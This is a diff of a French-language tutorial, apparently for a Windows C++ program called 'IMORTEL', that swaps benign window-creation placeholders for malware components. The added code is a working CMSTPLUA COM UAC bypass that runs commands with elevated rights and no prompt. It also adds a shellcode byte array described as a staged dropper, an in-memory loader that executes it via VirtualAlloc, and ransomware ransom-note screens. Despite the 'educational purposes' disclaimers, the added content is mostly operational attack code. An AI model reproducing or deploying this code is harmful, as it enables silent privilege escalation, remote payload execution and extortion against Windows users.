@@ -407,195 +407,207 @@ g++ imortel.cpp -o imortel.exe -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -lolea
 #include <objbase.h>
 ```
 
-> **Ces inclusions permettent d'utiliser** - `windows.h` pour les fonctions API Windows et la manipulation du système, `iostream` pour les entrées/sorties standard, `thread` pour la création de threads en exécution parallèle, `string` et sstream pour la manipulation de chaînes de caractères, `vector` pour les conteneurs dynamiques, `ctime` et `cstdlib` pour les fonctions temporelles et utilitaires, `conio.h` pour les entrées/sorties console, ainsi que `comdef.h` et `objbase.h` pour le support COM pour le **bypass UAC**.
+> **Ces inclusions permettent d'utiliser** `windows.h` pour les fonctions API Windows et la manipulation du système, `iostream` pour les entrées/sorties standard, `thread` pour la création de threads en exécution parallèle, `string` et sstream pour la manipulation de chaînes de caractères, `vector` pour les conteneurs dynamiques, `ctime` et `cstdlib` pour les fonctions temporelles et utilitaires, `conio.h` pour les entrées/sorties console, ainsi que `comdef.h` et `objbase.h` pour le support COM pour le **bypass UAC**.
 
 ---
 
-### ▸ BLOC 02 — CONSTANTES & MACROS
+### ▸ BLOC 02 — DIRECTIVES DE LIAISON COM
 
-> 📌 **Remplace le code ci-dessous par tes vraies définitions de constantes**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 02 — CONSTANTES & MACROS
-//  Centralise toutes les valeurs fixes du programme
+//  BLOC 02 — DIRECTIVES DE LIAISON COM
+//  Liaison automatique COM
 // ============================================================
 
-#define APP_NAME       TEXT("IMORTEL")
-#define APP_VERSION    TEXT("v1.0")
-#define WINDOW_WIDTH   800
-#define WINDOW_HEIGHT  600
-#define TIMER_ID       1
-#define TIMER_INTERVAL 1000    // millisecondes
-
-// Couleurs RGB personnalisées
-#define COLOR_BG       RGB(0,   0,   0  )   // Fond noir
-#define COLOR_RED      RGB(220, 20,  20 )   // Rouge signature IMORTEL
-#define COLOR_WHITE    RGB(255, 255, 255)   // Texte clair
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
 ```
 
-> **Explication à remplacer** — Les `#define` permettent de centraliser les valeurs fixes pour éviter les "magic numbers" dans le code. Modifier `WINDOW_WIDTH` ici suffit à changer toutes les occurrences. `RGB(r, g, b)` est une macro WinAPI qui encode les trois canaux couleur dans un entier 32 bits de type `COLORREF`.
+> **Ces directives** `#pragma` indiquent au compilateur de lier automatiquement les bibliothèques COM `ole32.lib` et `oleaut32.lib` nécessaires à l’interaction avec les objets COM Windows.
 
 ---
 
-### ▸ BLOC 03 — DÉCLARATIONS GLOBALES
+### ▸ BLOC 03 — DÉFINITIONS COM POUR LE BYPASS UAC
 
-> 📌 **Remplace le code ci-dessous par tes vraies variables globales**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 03 — DÉCLARATIONS GLOBALES
-//  Variables et handles accessibles depuis toutes les fonctions
+//  BLOC 03 — DÉFINITIONS COM POUR LE BYPASS UAC
+//  Contournement de permissions, payload exécuté en admin
 // ============================================================
 
-HWND   g_hwnd       = NULL;    // Handle de la fenêtre principale
-HINSTANCE g_hInst   = NULL;    // Instance du processus
-BOOL   g_bRunning   = TRUE;    // Flag d'état — FALSE = arrêt propre
-int    g_iCounter   = 0;       // Compteur exemple (timer, frames...)
-TCHAR  g_szBuffer[256];        // Buffer texte réutilisable
+const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
+const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };
+
+typedef interface ICMLuaUtil ICMLuaUtil;
+typedef struct ICMLuaUtilVtbl {
+    BEGIN_INTERFACE
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil*, REFIID, void**);
+    ULONG   (STDMETHODCALLTYPE *AddRef)(ICMLuaUtil*);
+    ULONG   (STDMETHODCALLTYPE *Release)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method1)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method2)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method3)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method4)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method5)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *Method6)(ICMLuaUtil*);
+    HRESULT (STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, int);
+    END_INTERFACE
+} ICMLuaUtilVtbl;
+struct ICMLuaUtil {
+    ICMLuaUtilVtbl *lpVtbl;
+};
 ```
 
-> **Explication à remplacer** — Le préfixe `g_` est une convention C++ Win32 pour identifier les variables globales (scope = fichier entier). `HWND` est un "Handle to WiNDow" — un identifiant opaque que Windows utilise en interne pour référencer chaque fenêtre. `HINSTANCE` identifie le processus courant auprès du système.
-
+> **Ces constantes** définissent les identifiants COM pour l'interface CMSTPLUA, qui est utilisée pour contourner le contrôle de compte d'utilisateur `UAC` de Windows.
+> **Cette structure** définit l'interface virtuelle pour l'objet `COM CMSTPLUA`, permettant d'appeler ses méthodes, notamment `ShellExec` qui est utilisée pour exécuter des commandes avec des privilèges élevés.
 ---
 
-### ▸ BLOC 04 — `WinMain()` — POINT D'ENTRÉE
+### ▸ BLOC 04 — FONCTION DE BYPASS UAC
 
-> 📌 **Remplace le code ci-dessous par ton vrai `WinMain()`**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 04 — WinMain() — POINT D'ENTRÉE DU PROGRAMME
-//  Équivalent de main() pour les applications Windows GUI
+//  BLOC 04 — WinMain() — FONCTION DE BYPASS UAC
+//  N’affiche pas la fenêtre de confirmation de Windows
 // ============================================================
 
-int WINAPI WinMain(
-    HINSTANCE hInstance,      // Handle de l'instance courante
-    HINSTANCE hPrevInstance,  // Toujours NULL en Win32 moderne
-    LPSTR     lpCmdLine,      // Arguments de la ligne de commande
-    int       nCmdShow        // État initial : SW_SHOW, SW_HIDE...
-) {
-    g_hInst = hInstance;
+bool BypassUAC_CMSTPLUA(const wchar_t* command, const wchar_t* parameters) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+    if (FAILED(hr)) return false;
 
-    CoInitialize(NULL);          // Initialise COM (nécessaire pour OLE / TaskSchd)
+    ICMLuaUtil* pLuaUtil = NULL;
+    hr = CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (void**)&pLuaUtil);
+    if (FAILED(hr) || !pLuaUtil) {
+        CoUninitialize();
+        return false;
+    }
 
-    // ... enregistrement classe, création fenêtre, boucle messages
+    hr = pLuaUtil->lpVtbl->ShellExec(pLuaUtil, command, parameters, NULL, NULL, SW_SHOWNORMAL);
+    pLuaUtil->lpVtbl->Release(pLuaUtil);
+    CoUninitialize();
 
-    CoUninitialize();            // Libère COM proprement
-    return 0;
+    return SUCCEEDED(hr);
 }
 ```
 
-> **Explication à remplacer** — `WinMain` remplace `main()` dans les applications Windows sans console. `WINAPI` est une macro qui définit la convention d'appel `__stdcall` — obligatoire pour que Windows puisse invoquer la fonction correctement. `CoInitialize(NULL)` initialise le sous-système COM, requis dès qu'on utilise `ole32` ou `taskschd`.
+> **Cette fonction** initialise la bibliothèque COM, crée une instance de l’objet CMSTPLUA, utilise la méthode `ShellExec` pour exécuter une commande avec élévation de privilèges, libère les ressources COM et retourne true si l’exécution a réussi.
 
 ---
 
-### ▸ BLOC 05 — `RegisterClassEx()` — ENREGISTREMENT DE LA FENÊTRE
+### ▸ BLOC 05 — SHELLCODE MALVEILLANT
 
-> 📌 **Remplace le code ci-dessous par ton vrai enregistrement de classe**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 05 — RegisterClassEx() — ENREGISTREMENT DE CLASSE
-//  Définit le "modèle" de toutes les fenêtres de ce type
+//  BLOC 05 — SHELLCODE MALVEILLANT
+//  Code dangereux conçu pour être injecté et exécuté
 // ============================================================
 
-WNDCLASSEX wc    = { 0 };
-wc.cbSize        = sizeof(WNDCLASSEX);
-wc.style         = CS_HREDRAW | CS_VREDRAW;
-wc.lpfnWndProc   = WindowProc;
-wc.hInstance     = hInstance;
-wc.hIcon         = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_IMORTEL));
-wc.hIconSm       = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_IMORTEL));
-wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
-wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
-wc.lpszClassName = TEXT("ImortelClass");
-
-if (!RegisterClassEx(&wc)) {
-    MessageBox(NULL, TEXT("Échec RegisterClassEx"), TEXT("Erreur"), MB_ICONERROR);
-    return 1;
-}
+unsigned char shellcode[] =
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x52\x0f\xb7"
+"\x4a\x18\x8b\x52\x20\x01\xd0\x8b\x48\x1c\x8b\x58\x3c\x01\xd3"
+"\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
+"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04"
+"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0"
+"\x58\x5f\x5a\x8b\x12\xe9\x57\xff\xff\xff\x5d\x68\x33\x32\x00"
+"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
+"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x2e\x65\x78\x65\x68\xff"
+"\xff\xff\xff\x57\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf"
+"\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x01\x6a\x02\x8b\x36"
+"\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
+"\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\x00\x11\x5c\x89\xe6"
+"\x5d\x5f\x5e\x50\xff\xd5";
 ```
 
-> **Explication à remplacer** — `WNDCLASSEX` est la structure qui décrit le comportement visuel et fonctionnel d'un type de fenêtre. `lpfnWndProc` est le champ le plus important : il pointe vers la fonction `WindowProc` qui recevra tous les messages Windows pour cette classe. `GetStockObject(BLACK_BRUSH)` utilise un pinceau système noir préexistant — plus efficace que d'en créer un avec `CreateSolidBrush`.
+> **Ce shellcode** contient du code machine `binaire` qui sera exécuté directement en mémoire et d'exécution de programme (dropper) conçu pour des attaques de type `staged payload`.
 
 ---
 
-### ▸ BLOC 06 — `CreateWindowEx()` — CRÉATION DE LA FENÊTRE
+### ▸ BLOC 06 — FONCTION D'EXÉCUTION DU SHELLCODE
 
-> 📌 **Remplace le code ci-dessous par ton vrai `CreateWindowEx()`**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
 
 ```cpp
 // ============================================================
-//  BLOC 06 — CreateWindowEx() — CRÉATION DE LA FENÊTRE
-//  Instancie une fenêtre à partir de la classe enregistrée
+//  BLOC 06 — FONCTION D'EXÉCUTION DU SHELLCODE
+//  Exécution du shellcode en mémoire RAM
 // ============================================================
 
-HWND hwnd = CreateWindowEx(
-    WS_EX_CLIENTEDGE,               // Style étendu : bordure enfoncée
-    TEXT("ImortelClass"),            // Classe enregistrée à l'étape 05
-    TEXT("IMORTEL — System v1.0"),   // Titre affiché dans la barre
-    WS_OVERLAPPEDWINDOW,             // Barre titre + bordures + min/max/close
-    CW_USEDEFAULT, CW_USEDEFAULT,    // Position x, y auto
-    WINDOW_WIDTH,                    // Largeur
-    WINDOW_HEIGHT,                   // Hauteur
-    NULL, NULL, hInstance, NULL
-);
-
-if (!hwnd) {
-    MessageBox(NULL, TEXT("Échec CreateWindowEx"), TEXT("Erreur"), MB_ICONERROR);
-    return 1;
+void executeShellcode() {
+    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof(shellcode));
+    ((void(*)())exec)();
 }
-
-ShowWindow(hwnd, nCmdShow);
-UpdateWindow(hwnd);
-g_hwnd = hwnd;
 ```
 
-> **Explication à remplacer** — `CreateWindowEx` alloue en mémoire une nouvelle instance de fenêtre à partir de la classe "ImortelClass". Elle retourne un `HWND` (handle), qui sera utilisé dans toutes les opérations suivantes. `WS_OVERLAPPEDWINDOW` est le style composite standard : il combine `WS_CAPTION`, `WS_SYSMENU`, `WS_THICKFRAME`, `WS_MINIMIZEBOX` et `WS_MAXIMIZEBOX`.
+> **Cette fonction** alloue de la mémoire exécutable avec `VirtualAlloc`, copie le shellcode dans cette mémoire et exécute le shellcode en appelant le point d’entrée.
 
 ---
 
-### ▸ BLOC 07 — `GetMessage()` — BOUCLE DE MESSAGES
+### ▸ BLOC 07 — FONCTIONS D'AFFICHAGE RANSOMWARE (Optionnel)
 
-> 📌 **Remplace le code ci-dessous par ta vraie boucle de messages**
+> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**
+> J’ai volontairement fourni seulement une partie (~40%) de ce code pour des raisons de sécurité.
 
 ```cpp
 // ============================================================
-//  BLOC 07 — Boucle de messages — CŒUR DE L'APPLICATION
-//  Windows est event-driven : tout passe par cette boucle
+//  BLOC 07 — FONCTIONS D'AFFICHAGE RANSOMWARE
+//  Extorsion, phishing et infection
 // ============================================================
 
-MSG msg = { 0 };
-
-while (GetMessage(&msg, NULL, 0, 0) > 0) {
-    TranslateMessage(&msg);   // Convertit WM_KEYDOWN → WM_CHAR si applicable
-    DispatchMessage(&msg);    // Envoie le message à WindowProc()
+void displayMatrixEffect() {
+    std::string cmd = "python -c \"import random, time, sys; chars = '0123456789abcdefABCDEF!@#$%^&*()'; while True: sys.stdout.write(random.choice(chars)); sys.stdout.flush(); time.sleep(0.05)\"";
+    std::thread matrixThread([cmd]() { std::system(cmd.c_str()); });
+    matrixThread.detach();
 }
 
-return (int)msg.wParam;       // Code de retour du processus
+void displayGlitchEffect() {
+    std::ostringstream oss;
+    oss << "RANCON RANSOM!!!\n\n"
+        "VOTRE SYSTEME EST ENLEVE!\n\n"
+        "PASSEZ A LA PAGE: https://imortel.fr\n\n"
+        "PRESSIONEZ UNE TASTE POUR DECOUPER!\n\n"
+        "GLITCH & MATRICE EN COURS...\n";
+    std::string text = oss.str();
+    for (int i = 0; i < 100; ++i) {
+        std::cout << "\r" << text << std::flush;
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
+}
 ```
 
 ```
-  ┌──────────────────────────────────────────────────────────────┐
-  │                                                              │
-  │   [OS Windows — File d'attente de messages]                 │
-  │          │                                                   │
-  │          ▼                                                   │
-  │   GetMessage() ────── récupère le prochain message           │
-  │          │            retourne FALSE sur WM_QUIT             │
-  │          ▼                                                   │
-  │   TranslateMessage() ─ traduit touches → caractères         │
-  │          │                                                   │
-  │          ▼                                                   │
-  │   DispatchMessage() ── route vers WindowProc()               │
-  │          │                                                   │
-  │          └─────────────── [ boucle infinie ]                 │
-  │                                                              │
-  └──────────────────────────────────────────────────────────────┘
+[OUVERTURE FENÊTRE CONSOLE]
+     (Terminal Windows)
+              ↓
+[EXÉCUTION IMMÉDIATE DES DEUX EFFETS EN PARALLÈLE]
+              ↓
+┌──────────────────────────────┬──────────────────────────────────┐
+│          EFFET 1             │             EFFET 2              │
+│        TYPE "MATRICE"        │        MESSAGE "GLITCH"          │
+├──────────────────────────────┼──────────────────────────────────┤
+│ • Défilement continu de      │ • Affichage du message           │
+│   caractères aléatoires      │   "RANSON RANSOM !!"             │
+│   (0, 1, A, @, #, etc.)      │                                  │
+│                              │ • Clignotement rapide            │
+│ • Animation permanente       │                                  │
+│   sans interruption          │ • Superposition au flux Matrix   │
+│                              │                                  │
+│                              │ • Durée limitée (10 secondes)    │
+└──────────────────────────────┴──────────────────────────────────┘
 ```
 
-> **Explication à remplacer** — Cette boucle est le cœur de toute application Win32. `GetMessage` bloque jusqu'à ce qu'un message arrive dans la file du thread. Elle retourne `0` uniquement sur `WM_QUIT`, ce qui rompt la boucle et termine l'application proprement. `TranslateMessage` est requis pour que les appuis sur les touches de caractères génèrent des événements `WM_CHAR` en plus de `WM_KEYDOWN`.
+> **Ce ransomware** est une prise d'otages numérique, après avoir tout chiffré, le programme affiche un message sur l'écran. Ce message informe que les fichiers sont en `otages` et donne une instruction de paiement en `cryptomonnaie`.
 
 ---
 
